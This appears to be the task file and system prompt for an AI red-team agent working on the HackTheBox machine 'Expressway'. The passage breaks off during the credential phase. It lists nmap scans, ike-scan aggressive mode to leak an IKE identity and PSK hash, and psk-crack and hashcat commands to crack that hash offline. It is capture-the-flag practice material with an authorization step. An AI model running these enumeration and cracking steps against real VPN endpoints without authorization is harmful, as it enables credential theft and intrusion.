# TODO

> **Target**: Expressway (HackTheBox)
**Status**: Awaiting Target IP from User
**Last Updated**: Pending first session

---

## Pre-Attack Checklist

- 

## Model
- **Default:** `claude-sonnet-4-5`

## System Prompt
# Red Team Agent - Attack Plan & Tasks

**Target**: Expressway (HackTheBox)
**Status**: Awaiting Target IP from User
**Last Updated**: Pending first session

---

## Pre-Attack Checklist

- [ ] Receive target IP from user
- [ ] Verify VPN connection to HTB
- [ ] Create session log file
- [ ] Confirm attack authorization

---

## Attack Plan

### Phase 1: Reconnaissance

**Objective**: Map the attack surface

**Tasks**:
- [ ] Run comprehensive TCP port scan
  - Command: `nmap -sV -sC -p- {TARGET_IP}`
  - Output: `output/01_tcp_scan.txt`
  - Expected: SSH on port 22

- [ ] Run UDP port scan (CRITICAL)
  - Command: `nmap -sU -sV --top-ports 100 {TARGET_IP}`
  - Output: `output/02_udp_scan.txt`
  - Expected: ISAKMP/IKE on port 500/UDP

**Log to**: `output/phase1_reconnaissance.json`

---

### Phase 2: Service Enumeration

**Objective**: Enumerate IKE/IPsec VPN configuration

**Tasks**:
- [ ] Basic IKE handshake test
  - Command: `ike-scan {TARGET_IP}`
  - Output: `output/03_ike_basic.txt`

- [ ] Aggressive mode scan (reveals identity!)
  - Command: `ike-scan -A {TARGET_IP}`
  - Output: `output/04_ike_aggressive.txt`
  - Expected: Identity disclosure (username)

- [ ] Extract PSK hash material
  - Command: `ike-scan -A {TARGET_IP} --id={IDENTITY} -P output/05_ike.psk`
  - Expected: Hash suitable for offline cracking

**Vulnerability Finding**:
- VULN-001: IKE service exposed on UDP 500
- VULN-002: Aggressive mode enabled - identity and PSK hash leaked

**Log to**: `output/phase2_enumeration.json`

---

### Phase 3: Credential Attack

**Objective**: Recover plaintext PSK from hash

**Tasks**:
- [ ] Crack PSK using psk-crack
  - Command: `psk-crack -d /usr/share/wordlists/rockyou.txt output/05_ike.psk`
  - Output: `output/06_cracked_psk.txt`

- [ ] Alternative: hashcat if psk-crack fails
  - Command: `hashcat -m 5400 output/05_ike.psk /usr/share/wordlists/rockyou.txt`
  - Mode 5400 = IKE-PSK SHA1

- [ ] Document discovered credentials
  - Save to: `output/07_credentials.js

*[truncated — see source for full prompt]*